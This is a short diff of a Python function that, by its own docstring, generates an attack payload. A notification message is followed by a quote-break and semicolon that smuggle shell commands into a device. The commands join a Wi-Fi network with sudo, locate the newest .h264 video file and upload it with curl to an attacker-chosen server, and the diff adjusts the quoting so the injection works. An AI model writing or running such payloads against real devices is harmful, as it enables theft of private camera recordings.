@@ -15,7 +15,7 @@ def generate_payload(video_dir, server_ip, server_port, ssid):
     """攻撃ペイロードの生成"""
     latest_file_cmd = f"ls -t {video_dir}/*.h264 | head -n 1"
     payload = (
-        f'"Your smartphone received a notification.; '
+        f'Your smartphone received a notification."; '
         f'sudo nmcli device wifi connect "{ssid}" && '
         f'sleep 7 && '
         f'curl -s -m 10 -F "file=@$({latest_file_cmd})" http://{server_ip}:{server_port}/upload; '
